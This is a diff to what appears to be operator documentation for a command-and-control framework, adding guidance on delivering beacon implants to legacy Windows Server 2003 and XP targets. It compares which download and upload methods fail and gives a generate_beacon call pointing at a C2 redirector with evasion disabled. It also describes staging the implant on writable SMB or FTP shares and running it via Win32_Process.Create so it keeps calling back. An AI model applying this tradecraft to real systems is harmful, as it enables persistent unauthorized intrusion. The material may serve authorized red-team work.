@@ -52,3 +52,46 @@ nohup setsid ./beacon </dev/null >/dev/null 2>&1 &
 This is the Linux counterpart to the Windows `Win32_Process.Create()` pattern:
 both decouple the beacon from the delivery session so it keeps calling back after
 you disconnect.
+
+## Legacy Windows delivery constraint (Win2003 / WinXP)
+
+32-bit targets running Windows Server 2003 SP2 or Windows XP SP3 lack most of
+the delivery primitives available on modern Windows. The standard pool beacon
+(obfuscated, ~33 MB for Win32) **cannot be delivered** to these targets; each
+mechanism hits a hard wall:
+
+| Mechanism | Result |
+|---|---|
+| `ADODB.Stream` + XMLHTTP | Buffers the full response in memory; `Write to file failed` on large responses (>~20 MB observed on Win2003 SP2). |
+| Meterpreter TLV upload | ~33 MB over the Meterpreter channel stalls and times out (10+ min); unusable in practice. |
+| PowerShell | Absent on Win2003 SP2. `IEX` / `Invoke-WebRequest` unavailable. |
+| `bitsadmin` / BITS | Not available in the IIS worker process security context on Win2003. |
+
+**Practical delivery limit:** ADODB.Stream XMLHTTP works reliably up to roughly
+10-20 MB on Win2003 SP2.
+
+### Recommended approach for legacy targets
+
+Generate a stripped-down beacon with obfuscation and evasion disabled so the
+output stays within the ~10-20 MB window:
+
+```
+generate_beacon(
+    c2_host="<redirector>",
+    protocol="https",
+    os="windows",
+    arch="386",
+    fmt="exe",
+    obfuscate=False,   # skip obfuscation -- saves ~10-15 MB on Win32
+    evasion=False,
+    name="pool-https-win32-slim",
+)
+```
+
+If the target has an **SMB share** or **FTP** that the operator can write to
+(e.g. via a Meterpreter session), stage the beacon there and execute via
+`Win32_Process.Create()`. This bypasses the XMLHTTP memory buffer entirely.
+
+> Note: pool builds (`pool-https-win32`) are normally obfuscated and will exceed
+> the delivery limit on Win2003/XP. Keep a separate slim build in the pool when
+> working legacy targets, or generate one on demand and remove it after use.
